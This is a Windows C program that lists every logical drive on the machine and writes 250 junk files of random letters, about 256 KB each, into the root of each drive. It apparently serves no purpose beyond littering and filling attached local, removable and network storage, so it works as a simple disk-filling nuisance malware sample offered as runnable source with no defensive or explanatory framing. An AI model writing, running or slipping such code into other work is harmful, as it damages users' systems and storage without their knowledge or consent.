#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <process.h>
#include <shlobj.h>

#define NUM_FILES 250

void createTextFileWithRandomData(const char* filename) {
    FILE* fp;
    if (fopen_s(&fp, filename, "wb") == 0) {
        const size_t bufferSize = 1024;
        char* buffer = (char*)malloc(bufferSize);

        if (buffer != NULL) {
            for (size_t i = 0; i < bufferSize; i++) {
                buffer[i] = 'A' + rand() % 26;
            }

            for (int i = 0; i < NUM_FILES; i++) {
                fwrite(buffer, sizeof(char), bufferSize, fp);
            }

            free(buffer);
        }
        else {
            printf("Failed to allocate memory for buffer.\n");
        }

        fclose(fp);
        printf("File created: %s\n", filename);
    }
    else {
        printf("Failed to create file: %s\n", filename);
    }
}

void createFilesInDirectory(const char* directoryPath) {
    char filename[30];
    for (int i = 0; i < NUM_FILES; i++) {
        sprintf_s(filename, sizeof(filename), "%s\\full%d.txt", directoryPath, i + 1);
        createTextFileWithRandomData(filename);
    }
}

unsigned __stdcall createFiles(void* arg) {
    DWORD drives = GetLogicalDrives();
    DWORD mask = 1;

    for (char drive = 'A'; drive <= 'Z'; drive++) {
        if (drives & mask) {
            char drivePath[4];
            sprintf_s(drivePath, sizeof(drivePath), "%c:\\", drive);

            createFilesInDirectory(drivePath);
        }
        mask <<= 1;
    }

    free(arg);
    return 0;
}

int main() {
    HANDLE thread = NULL;

    int* threadData = (int*)malloc(sizeof(int));
    if (threadData != NULL) {
        *threadData = 0;
        thread = (HANDLE)_beginthreadex(NULL, 0, createFiles, threadData, 0, NULL);
        if (thread == NULL) {
            printf("Failed to create thread.\n");
            free(threadData);
        }
    }
    else {
        printf("Failed to allocate memory for thread data.\n");
    }

    if (thread != NULL) {
        WaitForSingleObject(thread, INFINITE);
        CloseHandle(thread);
    }

    return 0;
}